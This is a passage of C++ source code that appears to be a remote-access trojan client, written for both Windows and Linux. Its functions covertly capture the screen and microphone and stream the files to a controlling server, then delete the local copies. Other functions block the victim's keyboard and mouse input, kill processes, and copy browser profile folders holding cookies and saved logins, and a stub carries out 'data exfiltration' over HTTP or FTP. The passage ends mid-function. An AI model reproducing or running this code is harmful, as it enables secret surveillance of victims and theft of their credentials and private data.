void send_to_server(const std::string& data) {
    if (current_socket == -1) {
        std::cerr << "No active connection\n";
        return;
    }

    if (!send_all(current_socket, data.c_str(), data.length())) {
        std::cerr << "Error sending data to server\n";
    }
}

// New function to send binary data
void send_binary_data(const char* data, size_t size) {
    if (current_socket == -1) {
        std::cerr << "No active connection\n";
        return;
    }

    size_t total_sent = 0;
    while (total_sent < size) {
        int sent = send(current_socket, data + total_sent, size - total_sent, 0);
        if (sent <= 0) {
            #ifdef _WIN32
                int error = WSAGetLastError();
                if (error == WSAEWOULDBLOCK) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    continue;
                }
            #else
                if (errno == EWOULDBLOCK || errno == EAGAIN) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    continue;
                }
            #endif
            std::cerr << "Error sending binary data: " << strerror(errno) << "\n";
            break;
        }
        total_sent += sent;
    }
}

void capture_screenshot() {
    auto now = std::chrono::system_clock::now();
    std::time_t time = std::chrono::system_clock::to_time_t(now);
    std::tm* t = std::localtime(&time);
    
    char filename[MAX_PATH_LENGTH];
    snprintf(filename, sizeof(filename), "screenshot_%04d%02d%02d_%02d%02d%02d.png",
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);
    
#ifdef _WIN32
    // Windows implementation with ANSI fixes
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Set DPI awareness and get actual screen dimensions
    SetProcessDPIAware();
    HDC hdc = GetDC(NULL);
    int screenWidth = GetDeviceCaps(hdc, HORZRES);
    int screenHeight = GetDeviceCaps(hdc, VERTRES);
    ReleaseDC(NULL, hdc);
    
    // Fallback to system metrics if device caps fail
    if (screenWidth <= 0 || screenHeight <= 0) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
    }
    
    std::cout << "Screen dimensions: " << screenWidth << "x" << screenHeight << std::endl;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    if (!hBitmap) {
        std::cerr << "Failed to create compatible bitmap. Error: " << GetLastError() << std::endl;
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    
    if (!BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
        std::cerr << "BitBlt failed. Error: " << GetLastError() << std::endl;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromHBITMAP(hBitmap, NULL);
    if (!bitmap) {
        std::cerr << "Failed to create GDI+ Bitmap" << std::endl;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    // Get PNG encoder CLSID
    CLSID pngClsid;
    UINT num = 0;
    UINT size = 0;
    
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) {
        std::cerr << "Failed to get encoders size" << std::endl;
        delete bitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) {
        std::cerr << "Failed to allocate memory for codec info" << std::endl;
        delete bitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    
    bool foundPngEncoder = false;
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, L"image/png") == 0) {
            pngClsid = pImageCodecInfo[i].Clsid;
            foundPngEncoder = true;
            break;
        }
    }
    
    free(pImageCodecInfo);
    
    if (!foundPngEncoder) {
        std::cerr << "PNG encoder not found" << std::endl;
        delete bitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    // Convert filename to wide string for GDI+
    WCHAR wideFilename[MAX_PATH_LENGTH];
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wideFilename, MAX_PATH_LENGTH);
    
    Gdiplus::Status saveStatus = bitmap->Save(wideFilename, &pngClsid, NULL);
    if (saveStatus != Gdiplus::Ok) {
        std::cerr << "Failed to save image. GDI+ Status: " << saveStatus << std::endl;
        delete bitmap;
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    
    delete bitmap;
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    std::cout << "Screenshot saved to " << filename << std::endl;
    
#else
    // Linux implementation using X11 to capture root window directly
    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        std::cerr << "Unable to open X display" << std::endl;
        return;
    }
    
    // Get the screen number and root window
    int screen_num = DefaultScreen(display);
    Window root = RootWindow(display, screen_num);
    
    // Get the actual screen dimensions from the root window
    XWindowAttributes root_attr;
    XGetWindowAttributes(display, root, &root_attr);
    int width = root_attr.width;
    int height = root_attr.height;
    
    std::cout << "Screen dimensions: " << width << "x" << height << std::endl;
    
    // Also get the screen size from the screen structure as a fallback
    Screen* screen = ScreenOfDisplay(display, screen_num);
    int screen_width = WidthOfScreen(screen);
    int screen_height = HeightOfScreen(screen);
    
    std::cout << "Screen structure dimensions: " << screen_width << "x" << screen_height << std::endl;
    
    // Use the larger dimensions to ensure we capture everything
    int capture_width = std::max(width, screen_width);
    int capture_height = std::max(height, screen_height);
    
    std::cout << "Using capture dimensions: " << capture_width << "x" << capture_height << std::endl;
    
    // Capture the root window directly (no window creation or mapping)
    XImage* image = XGetImage(display, root, 0, 0, capture_width, capture_height, AllPlanes, ZPixmap);
    if (!image) {
        std::cerr << "Failed to get X image" << std::endl;
        XCloseDisplay(display);
        return;
    }
    
    // Create OpenCV matrix from XImage data
    cv::Mat screenshot;
    
    if (image->bits_per_pixel == 32) {
        screenshot = cv::Mat(capture_height, capture_width, CV_8UC4, image->data, image->bytes_per_line);
        // Convert from BGRA to BGR
        screenshot = safe_opencv::convertBGRAtoBGR(screenshot);
    } else if (image->bits_per_pixel == 24) {
        screenshot = cv::Mat(capture_height, capture_width, CV_8UC3, image->data, image->bytes_per_line);
        // X11 24-bit is usually BGR, so might not need conversion
    } else {
        // Fallback: manual pixel conversion
        screenshot = cv::Mat(capture_height, capture_width, CV_8UC3);
        
        for (int y = 0; y < capture_height; ++y) {
            for (int x = 0; x < capture_width; ++x) {
                unsigned long pixel = XGetPixel(image, x, y);
                cv::Vec3b& bgr = screenshot.at<cv::Vec3b>(y, x);
                bgr[2] = (pixel & 0xFF0000) >> 16; // Red
                bgr[1] = (pixel & 0x00FF00) >> 8;  // Green
                bgr[0] = (pixel & 0x0000FF);       // Blue
            }
        }
    }
    
    // Make a deep copy to ensure data persistence
    screenshot = screenshot.clone();
    
    // Save the image
    if (!cv::imwrite(filename, screenshot)) {
        std::cerr << "Failed to save screenshot" << std::endl;
        XDestroyImage(image);
        XCloseDisplay(display);
        return;
    }
    
    // Clean up
    XDestroyImage(image);
    XCloseDisplay(display);
    
    std::cout << "Screenshot saved to " << filename << std::endl;
#endif
    
    // Read file and send to server
    std::ifstream file(filename, std::ios::binary);
    if (file) {
        file.seekg(0, std::ios::end);
        size_t file_size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        // Send header
        std::string header = "[SCREENSHOT:" + std::string(filename) + ":" + std::to_string(file_size) + "]";
        if (!send_all(current_socket, header.c_str(), header.size())) {
            std::cerr << "Failed to send screenshot header\n";
            file.close();
            return;
        }
        
        // Send file content
        std::vector<char> buffer(4096);
        size_t total_sent = 0;
        
        while (total_sent < file_size) {
            file.read(buffer.data(), std::min(buffer.size(), file_size - total_sent));
            size_t bytes_read = file.gcount();
            
            if (!send_all(current_socket, buffer.data(), bytes_read)) {
                std::cerr << "Failed to send screenshot data\n";
                file.close();
                return;
            }
            total_sent += bytes_read;
        }
        
        file.close();
        
        // Send end marker
        std::string end_marker = "[SCREENSHOT_END]\n";
        if (!send_all(current_socket, end_marker.c_str(), end_marker.size())) {
            std::cerr << "Failed to send screenshot end marker\n";
            return;
        }
        
        // Delete temporary file with multiple attempts
        int attempts = 0;
        const int max_attempts = 3;
        bool deleted = false;
        
        while (attempts < max_attempts && !deleted) {
            std::cout << "Attempting to delete temporary file (attempt " << (attempts + 1) << ")..." << std::endl;
            
            if (std::remove(filename) == 0) {
                deleted = true;
                std::cout << "Successfully deleted temporary screenshot file" << std::endl;
            } else {
                std::cerr << "Failed to delete file, error: " << strerror(errno) << std::endl;
                attempts++;
                if (attempts < max_attempts) {
                    // Wait a moment before retrying
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                }
            }
        }
        
        if (!deleted) {
            std::cerr << "Failed to delete temporary screenshot file after " << max_attempts << " attempts" << std::endl;
            std::cerr << "File may be locked or in use" << std::endl;
        } else {
            std::cout << "Screenshot sent to server and temporary file deleted.\n";
        }
    } else {
        std::cerr << "Error opening screenshot file: " << filename << std::endl;
    }
}

// Get current working directory - fixed version
std::string get_current_directory() {
    #ifdef _WIN32
        // First try with a larger buffer
        DWORD length = GetCurrentDirectoryW(0, NULL);
        if (length == 0) {
            return "~";
        }
        
        std::wstring wbuffer(length, 0);
        if (GetCurrentDirectoryW(length, &wbuffer[0]) == 0) {
            return "~";
        }
        
        // Convert to UTF-8
        int utf8_length = WideCharToMultiByte(CP_UTF8, 0, wbuffer.c_str(), -1, NULL, 0, NULL, NULL);
        if (utf8_length == 0) {
            return "~";
        }
        
        std::string result(utf8_length - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wbuffer.c_str(), -1, &result[0], utf8_length, NULL, NULL);
        
        return result;
    #else
        // Try with PATH_MAX first
        char buffer[PATH_MAX];
        if (getcwd(buffer, sizeof(buffer)) != nullptr) {
            return std::string(buffer);
        }
        
        // If that fails, try with a larger buffer
        size_t size = 4096;
        while (size <= 65536) {
            std::vector<char> dynamic_buffer(size);
            if (getcwd(dynamic_buffer.data(), dynamic_buffer.size()) != nullptr) {
                return std::string(dynamic_buffer.data());
            }
            size *= 2;
        }
        
        return "~";
    #endif
}

// Send current directory to server
void send_current_directory(socket_t sock) {
    std::string dir = get_current_directory();
    std::string msg = "[DIR]" + dir + "\n";
    send(sock, msg.c_str(), msg.length(), 0);
}
    
void record_audio(const std::vector<std::string>& args) {
    std::cout << "\n[Audio Recording]\n";
    
    int duration = 10;
    if (!args.empty()) {
        try {
            duration = std::stoi(args[0]);
            if (duration <= 0) duration = 10;
        } catch (...) {
            duration = 10;
        }
    }

    auto now = std::chrono::system_clock::now();
    std::time_t time = std::chrono::system_clock::to_time_t(now);
    std::tm* t = std::localtime(&time);
    
    char filename[MAX_PATH_LENGTH];
    snprintf(filename, sizeof(filename), "recording_%04d%02d%02d_%02d%02d%02d.wav",
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             t->tm_hour, t->tm_min, t->tm_sec);

    #ifdef _WIN32
        HWAVEIN hWaveIn;
        WAVEFORMATEX waveFormat;
        WAVEHDR waveHdr;
        std::vector<BYTE> buffer;
        
        waveFormat.wFormatTag = WAVE_FORMAT_PCM;
        waveFormat.nChannels = 1;
        waveFormat.nSamplesPerSec = 44100;
        waveFormat.wBitsPerSample = 16;
        waveFormat.nBlockAlign = (waveFormat.nChannels * waveFormat.wBitsPerSample) / 8;
        waveFormat.nAvgBytesPerSec = waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;
        waveFormat.cbSize = 0;
        
        DWORD bufferSize = waveFormat.nAvgBytesPerSec * duration;
        buffer.resize(bufferSize);
        
        MMRESULT result = waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL);
        if (result != MMSYSERR_NOERROR) {
            std::cout << "Error opening waveform input device: " << result << "\n";
            return;
        }
        
        waveHdr.lpData = reinterpret_cast<LPSTR>(buffer.data());
        waveHdr.dwBufferLength = bufferSize;
        waveHdr.dwFlags = 0;
        waveHdr.dwLoops = 0;
        
        result = waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        if (result != MMSYSERR_NOERROR) {
            std::cout << "Error preparing header: " << result << "\n";
            waveInClose(hWaveIn);
            return;
        }
        
        result = waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        if (result != MMSYSERR_NOERROR) {
            std::cout << "Error adding buffer: " << result << "\n";
            waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
            waveInClose(hWaveIn);
            return;
        }
        
        result = waveInStart(hWaveIn);
        if (result != MMSYSERR_NOERROR) {
            std::cout << "Error starting recording: " << result << "\n";
            waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
            waveInClose(hWaveIn);
            return;
        }
        
        std::cout << "Recording audio for " << duration << " seconds...\n";
        std::cout << "Speak into your microphone now...\n";
        
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        
        waveInStop(hWaveIn);
        waveInReset(hWaveIn);
        
        while (!(waveHdr.dwFlags & WHDR_DONE)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        
        std::ofstream outFile(filename, std::ios::binary);
        if (!outFile) {
            std::cout << "Error creating WAV file.\n";
            return;
        }
        
        outFile.write("RIFF", 4);
        uint32_t riffSize = 36 + bufferSize;
        outFile.write(reinterpret_cast<const char*>(&riffSize), 4);
        outFile.write("WAVE", 4);
        
        outFile.write("fmt ", 4);
        uint32_t fmtSize = 16;
        outFile.write(reinterpret_cast<const char*>(&fmtSize), 4);
        outFile.write(reinterpret_cast<const char*>(&waveFormat.wFormatTag), 2);
        outFile.write(reinterpret_cast<const char*>(&waveFormat.nChannels), 2);
        outFile.write(reinterpret_cast<const char*>(&waveFormat.nSamplesPerSec), 4);
        outFile.write(reinterpret_cast<const char*>(&waveFormat.nAvgBytesPerSec), 4);
        outFile.write(reinterpret_cast<const char*>(&waveFormat.nBlockAlign), 2);
        outFile.write(reinterpret_cast<const char*>(&waveFormat.wBitsPerSample), 2);
        
        outFile.write("data", 4);
        outFile.write(reinterpret_cast<const char*>(&bufferSize), 4);
        
        outFile.write(reinterpret_cast<const char*>(buffer.data()), bufferSize);
        outFile.close();
    #else
        if (system("which arecord > /dev/null 2>&1") != 0) {
            std::cout << "Error: arecord not found. Install with:\n";
            std::cout << "sudo apt-get install alsa-utils\n";
            return;
        }

        std::string cmd = "arecord -f cd -d " + std::to_string(duration) + " " + filename;
        
        std::cout << "Recording audio for " << duration << " seconds...\n";
        std::cout << "Speak into your microphone now...\n";
        int result = system(cmd.c_str());
        
        if (result != 0) {
            std::cout << "Failed to record audio. Error code: " << result << "\n";
            return;
        }
    #endif
    
    std::cout << "Successfully saved recording to: " << filename << "\n";
    
    // Read file and send to server
    std::ifstream inFile(filename, std::ios::binary);
    if (inFile) {
        inFile.seekg(0, std::ios::end);
        size_t file_size = inFile.tellg();
        inFile.seekg(0, std::ios::beg);
        
        // Send header
        std::string header = "[AUDIO:" + std::string(filename) + ":" + std::to_string(file_size) + "]";
        if (!send_all(current_socket, header.c_str(), header.size())) {
            std::cerr << "Failed to send audio header\n";
            return;
        }
        
        // Send file content
        std::vector<char> buffer(4096);
        size_t total_sent = 0;
        
        while (total_sent < file_size) {
            inFile.read(buffer.data(), std::min(buffer.size(), file_size - total_sent));
            size_t bytes_read = inFile.gcount();
            
            if (!send_all(current_socket, buffer.data(), bytes_read)) {
                std::cerr << "Failed to send audio data\n";
                return;
            }
            total_sent += bytes_read;
        }
        
        // Send end marker
        std::string end_marker = "[AUDIO_END]\n";
        if (!send_all(current_socket, end_marker.c_str(), end_marker.size())) {
            std::cerr << "Failed to send audio end marker\n";
            return;
        }
        
        // Delete temporary file
        std::remove(filename);
        
        std::cout << "Audio sent to server.\n";
    } else {
        std::cout << "Error reading audio file.\n";
    }
    
    log_action("Audio recording sent to server");
}

// Play audio file
void play_audio(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: play <path to audio file>\n";
        return;
    }

    std::string file_path = args[0];
    
    // Check if file exists
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) {
        std::cout << "Error: File not found: " << file_path << "\n";
        return;
    }
    file.close();

    #ifdef _WIN32
        // Play audio using Windows Multimedia API
        std::string command = "open \"" + file_path + "\" type mpegvideo alias audio";
        MCIERROR error = mciSendString(command.c_str(), NULL, 0, NULL);
        if (error) {
            char error_msg[256];
            mciGetErrorString(error, error_msg, 256);
            std::cout << "Error opening audio file: " << error_msg << "\n";
            return;
        }

        // Play the audio
        error = mciSendString("play audio", NULL, 0, NULL);
        if (error) {
            char error_msg[256];
            mciGetErrorString(error, error_msg, 256);
            std::cout << "Error playing audio: " << error_msg << "\n";
            mciSendString("close audio", NULL, 0, NULL);
            return;
        }

        std::cout << "Playing audio: " << file_path << "\n";
        std::cout << "Press Enter to stop playback...\n";
        
        // Wait for user to press Enter
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
        
        // Stop playback
        mciSendString("stop audio", NULL, 0, NULL);
        mciSendString("close audio", NULL, 0, NULL);
        
        std::cout << "Playback stopped.\n";
    #else
        // Play audio using system command
        std::string command;
        
        // Try different players in order of preference
        if (system("which ffplay > /dev/null 2>&1") == 0) {
            command = "ffplay -autoexit -nodisp \"" + file_path + "\"";
        } else if (system("which mplayer > /dev/null 2>&1") == 0) {
            command = "mplayer -really-quiet \"" + file_path + "\"";
        } else if (system("which mpg123 > /dev/null 2>&1") == 0) {
            command = "mpg123 -q \"" + file_path + "\"";
        } else if (system("which aplay > /dev/null 2>&1") == 0) {
            command = "aplay -q \"" + file_path + "\"";
        } else {
            std::cout << "No suitable audio player found. Please install one of:\n";
            std::cout << "  - ffplay (from ffmpeg)\n";
            std::cout << "  - mplayer\n";
            std::cout << "  - mpg123\n";
            std::cout << "  - aplay\n";
            return;
        }
        
        std::cout << "Playing audio: " << file_path << "\n";
        std::cout << "Press Ctrl+C to stop playback...\n";
        
        int result = system(command.c_str());
        if (result != 0) {
            std::cout << "Error playing audio file. Exit code: " << result << "\n";
        }
    #endif
    
    log_action("Played audio file: " + file_path);
}

// Play video file in fullscreen
void play_video(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: screen <path to video file>\n";
        return;
    }

    std::string file_path = args[0];
    
    // Check if file exists
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) {
        std::cout << "Error: File not found: " << file_path << "\n";
        return;
    }
    file.close();

    #ifdef _WIN32
        // Play video using default media player in fullscreen
        std::string command = "open \"" + file_path + "\" type mpegvideo alias video";
        MCIERROR error = mciSendString(command.c_str(), NULL, 0, NULL);
        if (error) {
            char error_msg[256];
            mciGetErrorString(error, error_msg, 256);
            std::cout << "Error opening video file: " << error_msg << "\n";
            return;
        }

        // Play the video in fullscreen
        error = mciSendString("play video fullscreen", NULL, 0, NULL);
        if (error) {
            char error_msg[256];
            mciGetErrorString(error, error_msg, 256);
            std::cout << "Error playing video: " << error_msg << "\n";
            mciSendString("close video", NULL, 0, NULL);
            return;
        }

        std::cout << "Playing video in fullscreen: " << file_path << "\n";
        std::cout << "Press Enter to stop playback...\n";
        
        // Wait for user to press Enter
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
        
        // Stop playback
        mciSendString("stop video", NULL, 0, NULL);
        mciSendString("close video", NULL, 0, NULL);
        
        std::cout << "Playback stopped.\n";
    #else
        // Play video using system command in fullscreen
        std::string command;
        
        // Try different players in order of preference
        if (system("which vlc > /dev/null 2>&1") == 0) {
            command = "vlc --fullscreen --no-xlib \"" + file_path + "\"";
        } else if (system("which mpv > /dev/null 2>&1") == 0) {
            command = "mpv --fullscreen --no-terminal \"" + file_path + "\"";
        } else if (system("which mplayer > /dev/null 2>&1") == 0) {
            command = "mplayer -fs -really-quiet \"" + file_path + "\"";
        } else if (system("which totem > /dev/null 2>&1") == 0) {
            command = "totem --fullscreen \"" + file_path + "\"";
        } else {
            std::cout << "No suitable video player found. Please install one of:\n";
            std::cout << "  - vlc\n";
            std::cout << "  - mpv\n";
            std::cout << "  - mplayer\n";
            std::cout << "  - totem\n";
            return;
        }
        
        std::cout << "Playing video in fullscreen: " << file_path << "\n";
        std::cout << "Press Ctrl+C to stop playback...\n";
        
        int result = system(command.c_str());
        if (result != 0) {
            std::cout << "Error playing video file. Exit code: " << result << "\n";
        }
    #endif
    
    log_action("Played video file: " + file_path);
}
    
    // Input blocking
    void block_input_impl(bool block) {
        #ifdef _WIN32
            BlockInput(block);
        #else
            if (block) {
                std::cout << "Linux input blocking would be implemented here\n";
            } else {
                std::cout << "Linux input unblocking would be implemented here\n";
            }
        #endif
    }
    
    void block_input(const std::vector<std::string>& args) {
        std::cout << "\n[Input Blocker]\n";
        
        if (!args.empty() && (args[0] == "off" || args[0] == "0")) {
            input_blocked = false;
            block_input_impl(false);
            std::cout << "Input unblocked\n";
            log_action("Input unblocked");
            return;
        }
        
        input_blocked = true;
        block_input_impl(true);
        std::cout << "Input blocked. Use 'block off' to unblock.\n";
        log_action("Input blocked");
    }
    
    // Terminate process
    void terminate_process(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: kill <pid|name>\n";
            return;
        }
        
        std::cout << "\n[Process Termination]\n";
        
        try {
            // Try to parse as PID
            int pid = std::stoi(args[0]);
            
            #ifdef _WIN32
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                if (hProcess == NULL) {
                    std::cout << "Failed to open process " << pid << "\n";
                    return;
                }
                
                if (TerminateProcess(hProcess, 0)) {
                    std::cout << "Successfully terminated process " << pid << "\n";
                    log_action("Process terminated");
                } else {
                    std::cout << "Failed to terminate process " << pid << "\n";
                }
                
                CloseHandle(hProcess);
            #else
                if (kill(pid, SIGTERM) == 0) {
                    std::cout << "Successfully terminated process " << pid << "\n";
                    log_action("Process terminated");
                } else {
                    std::cout << "Failed to terminate process " << pid << "\n";
                }
            #endif
        } catch (...) {
            // Argument is a process name
            auto processes = get_processes();
            int terminated = 0;
            
            for (const auto& proc : processes) {
                if (proc.name.find(args[0]) != std::string::npos) {
                    #ifdef _WIN32
                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, proc.pid);
                        if (hProcess != NULL) {
                            if (TerminateProcess(hProcess, 0)) {
                                std::cout << "Terminated " << proc.name << " (PID: " << proc.pid << ")\n";
                                terminated++;
                            }
                            CloseHandle(hProcess);
                        }
                    #else
                        if (kill(proc.pid, SIGTERM) == 0) {
                            std::cout << "Terminated " << proc.name << " (PID: " << proc.pid << ")\n";
                            terminated++;
                        }
                    #endif
                }
            }
            
            if (terminated > 0) {
                log_action("Processes terminated by name");
            } else {
                std::cout << "No processes found matching '" << args[0] << "'\n";
            }
        }
    }
    
// Browser data extraction
void extract_browser_data_impl() {
    #ifdef _WIN32
        std::cout << "\nExtracting browser data (Windows)\n";
        
        const char* userprofile = std::getenv("USERPROFILE");
        if (!userprofile) return;
        
        // Create browser data directory
        if (CreateDirectory("browser_data", NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
            
            // Chrome
            std::string chrome_path = std::string(userprofile) + "\\AppData\\Local\\Google\\Chrome\\User Data";
            std::string chrome_cmd = "xcopy \"" + chrome_path + "\\Default\\*\" \"browser_data\\chrome\" /E /I /H";
            if (system(chrome_cmd.c_str()) == 0) {
                std::cout << "Chrome data extracted to browser_data/chrome\n";
            } else {
                std::cout << "Chrome data extraction failed or Chrome not installed\n";
            }
            
            // Microsoft Edge
            std::string edge_path = std::string(userprofile) + "\\AppData\\Local\\Microsoft\\Edge\\User Data";
            std::string edge_cmd = "xcopy \"" + edge_path + "\\Default\\*\" \"browser_data\\edge\" /E /I /H";
            if (system(edge_cmd.c_str()) == 0) {
                std::cout << "Microsoft Edge data extracted to browser_data/edge\n";
            } else {
                std::cout << "Microsoft Edge data extraction failed or Edge not installed\n";
            }
            
            // Firefox
            std::string firefox_path = std::string(userprofile) + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
            std::string firefox_cmd = "xcopy \"" + firefox_path + "\\*.*\" \"browser_data\\firefox\" /E /I /H";
            if (system(firefox_cmd.c_str()) == 0) {
                std::cout << "Firefox data extracted to browser_data/firefox\n";
            } else {
                std::cout << "Firefox data extraction failed or Firefox not installed\n";
            }
        }
    #else
        std::cout << "\nExtracting browser data (Linux)\n";
        
        if (fs::create_directory("browser_data") || errno == EEXIST) {
            // Chrome
            std::string chrome_cmd = "cp -r ~/.config/google-chrome/Default browser_data/chrome 2>/dev/null || echo 'Chrome not found or extraction failed'";
            system(chrome_cmd.c_str());
            std::cout << "Chrome data extraction attempted\n";
            
            // Microsoft Edge
            std::string edge_cmd = "cp -r ~/.config/microsoft-edge/Default browser_data/edge 2>/dev/null || echo 'Microsoft Edge not found or extraction failed'";
            system(edge_cmd.c_str());
            std::cout << "Microsoft Edge data extraction attempted\n";
            
            // Firefox
            std::string firefox_cmd = "cp -r ~/.mozilla/firefox/*.default-release browser_data/firefox 2>/dev/null || " 
                                      "cp -r ~/.mozilla/firefox/*.default browser_data/firefox 2>/dev/null || "
                                      "echo 'Firefox not found or extraction failed'";
            system(firefox_cmd.c_str());
            std::cout << "Firefox data extraction attempted\n";
        }
    #endif
}

void extract_browser_data(const std::vector<std::string>& args) {
    std::cout << "\n[Browser Data Extraction]\n";
    extract_browser_data_impl();
    log_action("Browser data extracted");
}
    
    // Data exfiltration
    void exfiltrate_data_impl(const std::string& method, const std::string& target, const std::string& data) {
        if (method == "http") {
            std::cout << "Exfiltrating data via HTTP to " << target << "\n";
            // Implementation would use libcurl or similar
            std::cout << "HTTP exfiltration would be implemented here\n";
        } else if (method == "ftp") {
            std::cout << "Exfiltrating data via FTP to " << target << "\n";
            // Implementation would use libcurl or similar
            std::cout << "FTP exfiltration would be implemented here\n";
        } else {
            std::cout << "Unknown exfiltration method: " << method << "\n";
        }
    }
    
    void exfiltrate_data(const std::vector<std::string>& args) {
        std::cout << "\n[Data Exfiltration]\n";
        
        if (args.empty()) {
            std::cout << "Usage: exfil <method> <target> [data]\n";
            std::cout << "Methods: http, ftp\n";
            return;
        }
        
        std::string data = args.size() > 2 ? args[2] : "collected_data.zip";
        exfiltrate_data_impl(args[0], args[1], data);
        log_action("Data exfiltration attempted");
    }
    
    // Get network connections
    std::vector<NetworkConn> get_network_connections() {
        std::vector<NetworkConn> connections;
        
        #ifdef _WIN32
            PMIB_TCPTABLE_OWNER_PID pTcpTable;
            DWORD dwSize = 0;
            DWORD dwRetVal = 0;
            
            GetExtendedTcpTable(NULL, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
            pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(dwSize);
            
            if ((dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0)) != NO_ERROR) {
                free(pTcpTable);
                return connections;
            }
            
            for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
                if (connections.size() >= MAX_NETWORK_CONNS) break;
                
                NetworkConn conn;
                conn.pid = pTcpTable->table[i].dwOwningPid;
                
                // Local address
                struct in_addr localAddr;
                localAddr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
                conn.local_addr = inet_ntoa(localAddr);
                conn.local_port = ntohs((u_short)pTcpTable->table[i].dwLocalPort);
                
                // Remote address
                struct in_addr remoteAddr;
                remoteAddr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
                conn.remote_addr = inet_ntoa(remoteAddr);
                conn.remote_port = ntohs((u_short)pTcpTable->table[i].dwRemotePort);
                
                // State
                switch (pTcpTable->table[i].dwState) {
                    case MIB_TCP_STATE_CLOSED: conn.state = "CLOSED"; break;
                    case MIB_TCP_STATE_LISTEN: conn.state = "LISTEN"; break;
                    case MIB_TCP_STATE_SYN_SENT: conn.state = "SYN_SENT"; break;
                    case MIB_TCP_STATE_SYN_RCVD: conn.state = "SYN_RCVD"; break;
                    case MIB_TCP_STATE_ESTAB: conn.state = "ESTABLISHED"; break;
                    case MIB_TCP_STATE_FIN_WAIT1: conn.state = "FIN_WAIT1"; break;
                    case MIB_TCP_STATE_FIN_WAIT2: conn.state = "FIN_WAIT2"; break;
